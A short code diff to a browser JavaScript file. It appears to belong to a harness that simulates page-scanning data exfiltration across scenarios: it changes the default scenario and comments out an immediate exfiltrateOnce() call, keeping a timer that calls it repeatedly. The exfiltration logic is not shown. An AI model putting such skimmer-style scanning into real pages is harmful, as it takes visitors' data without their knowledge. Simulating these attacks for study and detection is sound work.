@@ -186,7 +186,7 @@
 
     const uaInfo = parseUserAgent();
     const caseId = window.CASE_ID || '';
-    const scenario = window.SCENARIO || 'thirdParty_cdn';
+    const scenario = window.SCENARIO || 'in-html';
 
     for (const f of found) {
       try { f.node.dataset.exfiltrated = '1'; } catch (e) {}
@@ -231,7 +231,7 @@
     }
 
     log(`Started scanning every ${intervalMs} ms`);
-    exfiltrateOnce();
+    // exfiltrateOnce();
     timer = setInterval(() => {
       exfiltrateOnce();
     }, intervalMs);
